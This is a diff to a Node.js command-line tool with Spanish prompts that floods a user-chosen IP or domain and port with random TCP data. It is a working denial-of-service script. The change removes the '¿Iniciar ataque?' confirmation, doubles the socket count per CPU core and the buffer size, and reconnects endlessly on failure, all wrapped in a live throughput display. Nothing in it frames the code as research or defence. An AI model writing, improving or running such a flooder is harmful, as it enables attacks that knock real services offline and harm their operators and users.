@@ -7,63 +7,51 @@ const readline = require('readline');
 const os       = require('os');
 const dns      = require('dns').promises;
 
-const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-const ask   = q => new Promise(r => rl.question(`\x1b[1;32m${q}\x1b[0m`, r));
+const rl  = readline.createInterface({ input: process.stdin, output: process.stdout });
+const ask = q => new Promise(r => rl.question(`\x1b[1;32m${q}\x1b[0m`, r));
 
-let target, port, duration, cons = 0, bytes = 0, fail = 0, start;
+let target, port, duration, start, cons = 0, bytes = 0, fail = 0;
 
 (async () => {
-  target   = await ask('Objetivo (IP/Dominio): ');
+  target   = await ask('Objetivo 〉 ');
   if (!net.isIP(target)) target = (await dns.resolve4(target))[0];
-  port     = parseInt(await ask('Puerto (1-65535): '));
-  duration = parseInt(await ask('Duración (segundos): '));
-  const cores = os.cpus().length || 1;
-  const threads = cores * 8;          // agresivo
-  console.log(`\n=== Resumen ===\nObjetivo: ${target}\nPuerto: ${port}\nDuración: ${duration}s\nHilos: ${threads}`);
-  if ((await ask('¿Iniciar ataque? (s/n): ')).toLowerCase() !== 's') return process.exit(0);
+  port     = parseInt(await ask('Puerto 〉 '));
+  duration = parseInt(await ask('Duración (s) 〉 '));
+
   start = Date.now();
-  attack(threads);
-  ui();
-  setTimeout(() => {
-    console.log('\n\n\x1b[1;32mAtaque finalizado\x1b[0m');
-    process.exit(0);
-  }, duration * 1000);
+  attack((os.cpus().length || 1) * 16);
+
+  const int = setInterval(() => {
+    const el   = (Date.now() - start) / 1000;
+    const pct  = Math.min(100, (el / duration) * 100);
+    const mbps = (bytes / 1048576 / el).toFixed(1);
+    const bar  = '█'.repeat(Math.floor(pct / 3.33)) + '░'.repeat(30 - Math.floor(pct / 3.33));
+    process.stdout.write(
+      `\r\x1b[38;5;50m${bar}\x1b[0m ` +
+      `\x1b[38;5;214m${pct.toFixed(0)}%\x1b[0m ` +
+      `\x1b[38;5;82m${mbps} MB/s\x1b[0m ` +
+      `\x1b[38;5;223m${(bytes/1048576).toFixed(1)} MB\x1b[0m ` +
+      `\x1b[38;5;196m${fail} fail\x1b[0m`
+    );
+  }, 250);
+
+  setTimeout(() => { clearInterval(int); console.log('\n\x1b[38;5;82m✓\x1b[0m'); process.exit(0); }, duration * 1000);
 })().catch(() => process.exit(1));
 
 function attack(threads) {
   for (let i = 0; i < threads; i++) blast();
   function blast() {
-    const s = net.connect(port, target, () => {
-      s.setNoDelay(true);   // sin buffer interno
-      flood(s);
-    });
+    const s = net.connect(port, target, () => { s.setNoDelay(true); flood(s); });
     s.on('error', () => { fail++; s.destroy(); blast(); });
     s.on('close', blast);
   }
 }
 
 function flood(socket) {
-  const buf = crypto.randomBytes(4096);
+  const buf = crypto.randomBytes(8192);
   function write() {
-    while (socket.write(buf, err => err && fail++)) {
-      cons++; bytes += buf.length;
-    }
+    while (socket.write(buf, err => err && fail++)) { cons++; bytes += buf.length; }
     socket.once('drain', write);
   }
   write();
-}
-
-function ui() {
-  const totalMB = () => (bytes / 1048576).toFixed(1);
-  const bar = (p, w = 30) => '█'.repeat(Math.floor(p * w)) + '░'.repeat(w - Math.floor(p * w));
-  const int = setInterval(() => {
-    const elapsed = (Date.now() - start) / 1000;
-    const pct = Math.min(100, (elapsed / duration) * 100);
-    const mbps = (bytes / 1048576 / elapsed).toFixed(1);
-    process.stdout.write(
-      `\r\x1b[36m[${bar(pct / 100)}] \x1b[35m${pct.toFixed(0)}% ` +
-      `\x1b[32m${mbps} MB/s \x1b[33m${totalMB()} MB \x1b[31m${fail} fail\x1b[0m`
-    );
-  }, 300);
-  process.on('SIGINT', () => { clearInterval(int); console.log('\n\x1b[33mDetenido\x1b[0m'); process.exit(0); });
 }
